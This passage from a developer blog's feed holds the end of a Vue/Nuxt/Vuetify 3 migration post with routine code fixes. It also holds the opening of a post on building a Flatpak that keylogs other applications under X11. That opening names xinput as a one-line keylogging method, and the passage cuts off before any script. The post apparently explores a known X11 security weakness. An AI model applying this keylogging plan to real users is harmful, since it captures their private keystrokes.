src="https://s2.loli.net/2023/07/24/RUnmBtFw6uek8C2.webp" alt="Example 1 using Options API" style="width: 75%;"></p><p><strong>2. Code in the Composition API</strong><br><img src="https://s2.loli.net/2023/07/24/6NhIKwSBHWCMtq3.webp" alt="Example 1 using Composition API" style="width: 75%;"></p><p><strong>3. Simplified the above code by using the <code>&lt;script setup&gt;</code> syntax</strong><br><img src="https://s2.loli.net/2023/07/24/NtQJsyaC31X7Kfc.webp" alt="Example 1 using Composition API with script setup" style="width: 75%;"></p></details><details><summary><u><b>‚ùì How to inject in context in Nuxt 3</b></u></summary><p>In Nuxt 2, we used to use <code>useContext</code> to access the Nuxt context within the composition API, such as:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// plugins/hello.js</span></span><br><span class="line"><span class="comment">// Inject $hello(msg) in Vue, context and store.</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> (&#123; app &#125;, inject) =&gt; &#123;</span><br><span class="line">  <span class="title function_">inject</span>(<span class="string">&#x27;hello&#x27;</span>, <span class="function"><span class="params">msg</span> =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Hello <span class="subst">$&#123;msg&#125;</span>!`</span>))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// nuxt.config.js</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  <span class="attr">plugins</span>: [<span class="string">&#x27;~/plugins/hello.js&#x27;</span>]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// HelloWorldComponent.vue</span></span><br><span class="line"><span class="comment">// $hello can be accessed from context.</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  <span class="title function_">mounted</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.$hello(<span class="string">&#x27;mounted&#x27;</span>) <span class="comment">// Prints &#x27;Hello mounted!&#x27;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="title function_">asyncData</span>(<span class="params">&#123; app, $hello &#125;</span>) &#123;</span><br><span class="line">    $hello(<span class="string">&#x27;asyncData&#x27;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>In Nuxt 3, we can access runtime app context within composables, components and plugins, such as:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// plugins/hello.js</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title function_">defineNuxtPlugin</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> nuxtApp = <span class="title function_">useNuxtApp</span>() <span class="comment">// access runtime nuxt app instance</span></span><br><span class="line">  nuxtApp.<span class="title function_">provide</span>(<span class="string">&#x27;hello&#x27;</span>, <span class="function">(<span class="params">name</span>) =&gt;</span> <span class="string">`Hello <span class="subst">$&#123;name&#125;</span>!`</span>) <span class="comment">// provide helpers</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// HelloWorldComponent.vue </span></span><br><span class="line"><span class="comment">// useNuxtApp (on the server) only works during setup</span></span><br><span class="line"><span class="comment">// inside Nuxt plugins or Lifecycle Hooks.</span></span><br><span class="line"><span class="keyword">const</span> nuxtApp = <span class="title function_">useNuxtApp</span>()</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(nuxtApp.$hello(<span class="string">&#x27;name&#x27;</span>)) <span class="comment">// Prints &quot;Hello name!&quot;</span></span><br></pre></td></tr></table></figure><ul><li><a href="https://nuxt.com/docs/guide/going-further/nuxt-app#nuxtapp">Nuxt 3 NuxtApp</a></li><li><a href="https://v2.nuxt.com/docs/directory-structure/plugins/#inject-in-root--context">Nuxt 2 Inject in $root &amp; context</a></li><li><a href="https://composition-api.nuxtjs.org/api/usecontext/">Nuxt 2 @nuxt&#x2F;composition-api useContext</a></li><li><a href="https://krutiepatel.com/blog/nuxt-context-where-is-it-in-nuxt-3/">Nuxt Context: where is it in Nuxt 3</a></details></li></ul><details><summary><u><b>‚ùì How to use dynamic components in Vue 3</b></u></summary><p>In Vue 2, we define the dynamic components in the <code>components</code> property, such as:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  <span class="attr">components</span>: &#123;</span><br><span class="line">    <span class="title class_">MyComponent</span>: <span class="function">() =&gt;</span></span><br><span class="line">      process.<span class="property">client</span></span><br><span class="line">        ? <span class="title function_">import</span>(<span class="string">&quot;my-component&quot;</span>)</span><br><span class="line">        : <span class="title class_">Promise</span>.<span class="title function_">resolve</span>(&#123; <span class="attr">render</span>: <span class="function">(<span class="params">h</span>) =&gt;</span> <span class="title function_">h</span>(<span class="string">&quot;div&quot;</span>) &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>In Vue 3, we can use <code>defineAsyncComponent</code> function, which accepts a loader function that returns a Promise.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">MyComponent</span> = <span class="title function_">defineAsyncComponent</span>(<span class="function">() =&gt;</span> <span class="title function_">import</span>(<span class="string">&#x27;my-component&#x27;</span>))</span><br></pre></td></tr></table></figure><ul><li><a href="https://vuejs.org/guide/essentials/component-basics.html#dynamic-components">Vue 3 Dynamic Components</a></li><li><a href="https://vuejs.org/guide/components/async.html#async-components">Vue 3 Async Components</a></details></li></ul><details><summary><u><b>‚ùì How to use labs components in Vuetify 3</b></u></summary><p><strong>1. Way 1:</strong> Import and bootstrap <code>v-data-table</code> in your component:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script setup&gt;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">VDataTable</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;vuetify/labs/VDataTable&#x27;</span></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><strong>2. Way 2:</strong> Make the component available globally by importing it in Vuetify plugin.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; createVuetify &#125; <span class="keyword">from</span> <span class="string">&#x27;vuetify&#x27;</span></span><br><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> components <span class="keyword">from</span> <span class="string">&#x27;vuetify/components&#x27;</span></span><br><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> labsComponents <span class="keyword">from</span> <span class="string">&#x27;vuetify/labs/components&#x27;</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title function_">createVuetify</span>(&#123;</span><br><span class="line">  <span class="attr">components</span>: &#123;</span><br><span class="line">    ...components,</span><br><span class="line">    ...labsComponents,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></details><details><summary><u><b>‚ùì How to define themes in Vuetify 3</b></u></summary><p>Define the themes in plugins&#x2F;vuetify file, light and dark are pre-installed in Vuetify 3, and you can change the color of them as following:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// plugins/vuetify.ts</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title function_">defineNuxtPlugin</span>(<span class="function">(<span class="params">nuxtApp</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> vuetify = <span class="title function_">createVuetify</span>(&#123;</span><br><span class="line">    <span class="attr">ssr</span>: <span class="literal">true</span>,</span><br><span class="line">    components,</span><br><span class="line">    directives,</span><br><span class="line">    <span class="attr">themes</span>: &#123;</span><br><span class="line">        <span class="attr">light</span>: &#123;</span><br><span class="line">          <span class="attr">colors</span>: &#123;</span><br><span class="line">            <span class="attr">something</span>: <span class="string">&#x27;#fff&#x27;</span></span><br><span class="line">          &#125;,</span><br><span class="line">          <span class="attr">dark</span>: <span class="literal">false</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">dark</span>: &#123;</span><br><span class="line">          <span class="attr">colors</span>: &#123;</span><br><span class="line">            <span class="attr">something</span>: <span class="string">&#x27;#000&#x27;</span></span><br><span class="line">          &#125;,</span><br><span class="line">          <span class="attr">dark</span>: <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">  nuxtApp.<span class="property">vueApp</span>.<span class="title function_">use</span>(vuetify)</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    <span class="attr">provide</span>: &#123;</span><br><span class="line">      vuetify</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>To get the ‚Äòsomething‚Äô color under colors, you can do like this: </p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.your-class-name</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">rgb</span>(<span class="built_in">var</span>(--v-theme-something))</span><br><span class="line">  color: <span class="built_in">rgba</span>(<span class="built_in">var</span>(--v-theme-on-something), <span class="number">0.9</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>To change the theme by clicking, you can do like this: </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">v-btn</span> @<span class="attr">click</span>=<span class="string">&quot;toggleTheme&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      toggle theme</span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">v-btn</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">setup</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="keyword">import</span> &#123; useTheme &#125; <span class="keyword">from</span> <span class="string">&#x27;vuetify&#x27;</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="keyword">const</span> theme = <span class="title function_">useTheme</span>()</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="keyword">const</span> <span class="title function_">toggleTheme</span> = (<span class="params"></span>) =&gt; &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  theme.<span class="property">global</span>.<span class="property">name</span>.<span class="property">value</span> = theme.<span class="property">global</span>.<span class="property">current</span>.<span class="property">value</span>.<span class="property">dark</span> ? <span class="string">&#x27;light&#x27;</span> : <span class="string">&#x27;dark&#x27;</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">&#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure></details><details><summary><u><b>‚ùì How to migrate useFetch from @nuxt/composition-api to Nuxt 3</b></u></summary><p>In Nuxt 2, I use useFetch API from <code>@nuxt/composition-api</code>, like this:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">v-if</span>=<span class="string">&quot;fetchState.pending&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      something</span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="keyword">import</span> &#123; defineComponent, ref, useFetch &#125; <span class="keyword">from</span> <span class="string">&#x27;@nuxtjs/composition-api&#x27;</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="keyword">import</span> axios <span class="keyword">from</span> <span class="string">&#x27;axios&#x27;</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title function_">defineComponent</span>(&#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="title function_">setup</span>(<span class="params"></span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">const</span> name = <span class="title function_">ref</span>(<span class="string">&#x27;&#x27;</span>)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">const</span> &#123; fetchState &#125; = <span class="title function_">useFetch</span>(<span class="keyword">async</span> () =&gt; &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      name.<span class="property">value</span> = <span class="keyword">await</span> axios.<span class="title function_">get</span>(<span class="string">&#x27;https://myapi.com/name&#x27;</span>)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    &#125;)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  &#125;,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">&#125;)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>In Nuxt 3, there are many replacements, such as <code>useAsyncData</code> and <code>useFetch</code> that are auto-imported in Nuxt 3 project.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">v-if</span>=<span class="string">&quot;pending&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      something</span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">setup</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="keyword">const</span> &#123; pending, <span class="attr">data</span>: name, error, refresh &#125; = <span class="title function_">useAsyncData</span>(<span class="string">&#x27;myapi&#x27;</span>, <span class="function">() =&gt;</span> $fetch(<span class="string">&#x27;https://myapi.com/name&#x27;</span>))</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>What‚Äôs more, we can define options in <code>useAsyncData</code> including <code>lazy</code>, <code>transform</code>, <code>watch</code>. See more <a href="https://nuxt.com/docs/api/composables/use-async-data#params">here</a>.</p></details><details><summary><u><b>‚ùì Error: v-on with no argument expects an object value</b></u></summary><p>I got this warning in console when page first rendered, and it led to the problem that the menu doesn‚Äôt show when button is clicked, same problem for v-tooltip. After diving into the Vuetify 3 documentation, I found the solution in the <a href="https://vuetifyjs.com/en/getting-started/upgrade-guide/">upgrade guide</a>, there‚Äôs a general change for components:</p><ul><li>Activator slots work slightly different. </li><li>Replace <code>#activator=&#123; attrs, on &#125;</code> with <code>#activator=&#123; props &#125;</code>, then remove <code>v-on=&quot;on&quot;</code> and replace <code>v-bind=&quot;attrs&quot;</code> with <code>v-bind=&quot;props&quot;</code>.<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// before</span></span><br><span class="line">&lt;v-tooltip&gt;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">template</span> #<span class="attr">activator</span>=<span class="string">&quot;&#123; on, attrs &#125;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">span</span> <span class="attr">v-on</span>=<span class="string">&quot;on&quot;</span> <span class="attr">v-bind</span>=<span class="string">&quot;attrs&quot;</span>&gt;</span>&#123;&#123; title &#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">template</span>&gt;</span></span></span><br><span class="line">&lt;/v-tooltip&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">// after</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">v-tooltip</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">template</span> #<span class="attr">activator</span>=<span class="string">&quot;&#123; props &#125;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">span</span> <span class="attr">v-bind</span>=<span class="string">&quot;props&quot;</span>&gt;</span>&#123;&#123; title &#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">template</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">v-tooltip</span>&gt;</span></span></span><br></pre></td></tr></table></figure>Related issue: <a href="https://github.com/vuetifyjs/vuetify/issues/14299">here</a></details></li></ul><details><summary><u><b>‚ùì Error: Transition renders non-element root node that cannot be animated</b></u></summary><p>Just keep there is only one root element.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span>can not work<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">  „ÄÄ<span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  „ÄÄ<span class="tag">&lt;<span class="name">div</span>&gt;</span>can work now<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure></details><details><summary><u><b>‚ùì Error: Cannot read _leaveCb property</b></u></summary><p>This error happened when using watch to refresh the data and assign a value to template. Both of these give an error, but disappeared if remove <code>watch</code>:</p><ol><li><code>watch(props, refresh);</code>.</li><li>add <code>watch: [props]</code> within <code>useAsyncData</code>.</li></ol><p>I have tried all the solutions mentioned in similar issues, but only one of them works for me: <strong>Add <code>&lt;ClientOnly&gt;</code> around¬†the component.</strong></p><p>Related issues: <a href="https://github.com/nuxt/nuxt/issues/13309">nuxt issue</a>, <a href="https://github.com/vuejs/router/issues/341">vue-router issue</a>.</p></details><details><summary><u><b>‚ùì Error: localStorage is not defined in nuxt server-side</b></u></summary><p>When you use SSR you don‚Äôt have access to the browser storage, <code>localStorage</code> can only work on client side when <code>process.client</code> is true.</p></details><h2 id="Lessons-Learned"><a href="#Lessons-Learned" class="headerlink" title="Lessons Learned"></a>Lessons Learned</h2><p><img src="https://s2.loli.net/2023/08/02/HebPvx5LIYsXwUk.png" alt="Frame 5 _1_.png"></p><h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>The migration from Vue 2&#x2F;Nuxt 2&#x2F;Vuetify 2 to Vue 3&#x2F;Nuxt 3&#x2F;Vuetify 3 has been a challenging but highly rewarding journey. By choosing to upgrade the project from its existing codebase, I was able to preserve valuable configurations, logic, and functionality, saving time and effort that would have been required to start from scratch.</p><p>Throughout the migration process, I have navigated through various aspects, including Nuxt 3 changes, Vue 3 breaking changes, Vuetify 3 updates, and package adjustments. By leveraging the official documentation, seeking support from my mentor üí™, and also the discussion form the community like GitHub, StackOverflow, and Discord, I overcame obstacles and found solutions to intricate problems.</p><p>Migrating a project of this scale required patience, perseverance, and attention to detail. At times, I faced moments of frustration and uncertainty üò¢, but with determination and the guidance of my mentor, I stayed focused on the goal üéØ. The adoption of TypeScript in the Nuxt 3 project further enhanced code safety and maintainability, ensuring a more robust codebase. üîù</p><p>As I progressed through each migration phase, I carefully integrated new versions, refactored components using the Composition API, and verified functionality through rigorous testing. This meticulous approach ensured a successful transition to Vue 3 and Nuxt 3, unleashing the full potential of their features.</p><p>This migration project has taught me valuable lessons in <strong>staying adaptable</strong>, <strong>seeking support</strong>, <strong>problem-solving</strong>, and the importance of <strong>continuous learning</strong> to keep our projects at the forefront of web development. üëç And thanks again for <strong>my mentor R.J.</strong> for his unwavering support, guidance, and belief in my abilities, without which this achievement would not have been possible. I‚Äôm truly grateful for his time and encouragement throughout this remarkable journey. üòÑ</p><img src="https://s2.loli.net/2023/07/24/rZjVip8quw4f6PQ.png" style="width: 40%;"><hr><p>References:</p><ul><li><a href="https://harlanzw.com/blog/nuxt-3-migration-cheatsheet">Nuxt 3 Migration Simplified: A Cheat Sheet</a></li><li><a href="https://gist.github.com/mgd216/33d7805847f9bb1ef23a381fd76e22e6">Vue3 &#x2F; Nuxt3 &#x2F; Vuetify3 Migration Steps</a></li><li><a href="https://debbie.codes/blog/migrating-nuxt2-nuxt3/">Migrating from Nuxt 2 to Nuxt 3</a></li><li><a href="https://medium.com/arcana-network-blog/vue-3-composition-api-basics-and-patterns-44813f2c785d">Vue 3 Composition API: Basics and Patterns</a></li><li><a href="https://www.telerik.com/blogs/100-things-you-should-know-about-nuxt-3">100 Things You Should Know About Nuxt 3</a></li><li><a href="https://levelup.gitconnected.com/vuejs-3-migrating-from-options-to-composition-api-e8a765e57b8d">Vuejs 3: Migrating from Options to Composition API</a></li><li><a href="https://masteringnuxt.com/nuxt2">Mastering Nuxt 2 Course</a> and <a href="https://masteringnuxt.com/nuxt3">Mastering Nuxt 3 Course</a>.</li><li><a href="https://chrlschn.medium.com/nuxt-3-with-ssr-on-google-cloud-firebase-functions-2023-b80f7c4d4b4d">Nuxt 3 with SSR on Google Cloud Firebase Functions (2023)</a></li><li><a href="https://nitro.unjs.io/deploy/providers/firebase">Deploy Nitro apps to Firebase.</a></li></ul><p>üîç Check out the demo project in <a href="https://github.com/Beking0912/vue3-nuxt3-vuetify3-starter"><strong>github</strong></a>.<br>üìÆ If find any errors, please feel free to discuss and correct them: <a href="mailto:&#x62;&#115;&#117;&#x35;&#x40;&#x6e;&#x63;&#x73;&#117;&#46;&#x65;&#x64;&#x75;">&#x62;&#115;&#117;&#x35;&#x40;&#x6e;&#x63;&#x73;&#117;&#46;&#x65;&#x64;&#x75;</a>.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;img src=&quot;https://s2.loli.net/2023/07/24/F9cwXKE6x3zoUtf.png&quot; style=&quot;width:50%;&quot;&gt;
As technology evolves, so must our projects. 
With Vue 2 s</summary>
      
    
    
    
    <category term="Coding" scheme="https://beking0912.github.io/categories/Coding/"/>
    
    <category term="Migration" scheme="https://beking0912.github.io/categories/Coding/Migration/"/>
    
    
    <category term="Nuxt" scheme="https://beking0912.github.io/tags/Nuxt/"/>
    
    <category term="Vue" scheme="https://beking0912.github.io/tags/Vue/"/>
    
  </entry>
  
  <entry>
    <title>üíª Flatpak Development: X11 Keylogger</title>
    <link href="https://beking0912.github.io/2023/04/04/Flatpak-Development-A-11-Keylogger/"/>
    <id>https://beking0912.github.io/2023/04/04/Flatpak-Development-A-11-Keylogger/</id>
    <published>2023-04-04T21:06:13.000Z</published>
    <updated>2023-04-13T01:49:29.298Z</updated>
    
    <content type="html"><![CDATA[<p>X11 has been a widely used windowing system on Unix platforms for decades, but its security vulnerabilities have become increasingly apparent. As the transition to the more secure Wayland windowing system is slow, X11 remains in use in many Linux distributions as the default window system. One of the insecure aspects of X11 is the ability to perform keylogging with a simple one-line shell command using the xinput command.<br>In this blog post, we will explore how to create a Flatpak, a sandboxed application package, that can eavesdrop on keyboard entries of other applications outside of its sandbox in an X11 window session.</p><h2 id="Environment"><a href="#Environment" class="headerlink" title="Environment"></a>Environment</h2><ul><li><strong>Environment</strong>: VMware Fusion, Fedora 37, X11</li><li><a href="https://en.wikipedia.org/wiki/X_Window_System"><strong>X11</strong></a>: X11 is a windowing system used on Unix-like operating systems for bitmap displays.</li><li><a href="https://en.wikipedia.org/wiki/Flatpak"><strong>Flatpak</strong></a>: Flatpak is a Linux utility for software deployment and package management that provides a sandbox environment to run applications in isolation from the system.</li><li>You should be logged into the X11 windowing environment for the keylogger to work, confirm by executing <code>echo $XDG_SESSION_TYPE</code>.</li></ul><h2 id="Build-a-Flatpak"><a href="#Build-a-Flatpak" class="headerlink" title="Build a Flatpak"></a>Build a Flatpak</h2><h3 id="1-Install-a-runtime-and-the-matching-SDK"><a href="#1-Install-a-runtime-and-the-matching-SDK" class="headerlink" title="1. Install a runtime and the matching SDK"></a>1. Install a runtime and the matching SDK</h3><p>Install the freedesktop Platform and SDK runtimes from Flathub, which are used to build and run Flatpak applications.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flatpak install flathub org.freedesktop.Platform//22.08 org.freedesktop.Sdk//22.08</span><br></pre></td></tr></table></figure><h3 id="2-Create-a-script-named-as-keylogger-sh"><a 